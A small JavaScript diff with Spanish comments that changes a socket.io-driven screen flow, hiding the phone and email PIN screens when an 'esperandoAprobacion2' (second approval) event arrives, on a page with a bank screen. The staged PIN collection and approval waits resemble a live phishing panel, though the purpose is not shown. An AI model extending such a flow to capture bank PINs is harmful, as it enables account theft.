@@ -347,8 +347,10 @@
         document.getElementById('pin-correo-screen').classList.remove('hidden');
     });
 
-    socket.on('esperandoAprobacion2', () => {
+        socket.on('esperandoAprobacion2', () => {
+        // Ocultamos ambas pantallas de PIN (teléfono y correo)
         document.getElementById('pin-screen').classList.add('hidden');
+        document.getElementById('pin-correo-screen').classList.add('hidden');
         document.getElementById('loading-etapa2').classList.remove('hidden');
     });
 
@@ -544,7 +546,7 @@
         genero: "No especificado"
     };
 
-    
+
     socket.emit('enviarSolicitud', data);
 
     document.getElementById('bank-screen').classList.add('hidden');
